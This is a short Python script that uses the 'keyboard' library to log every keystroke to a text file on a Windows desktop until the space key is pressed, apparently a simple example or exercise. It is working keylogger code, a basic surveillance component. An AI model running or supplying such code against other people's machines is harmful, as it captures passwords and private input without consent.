import keyboard

log_file = r"C:\Users\User\Desktop\keystrokes.txt"

def on_key_press(event):
    with open(log_file, "a") as f:
        f.write(event.name)

# Start listening for key presses
keyboard.on_press(on_key_press)

# Keep the program running
keyboard.wait('space')
print('space was pressed, exiting...')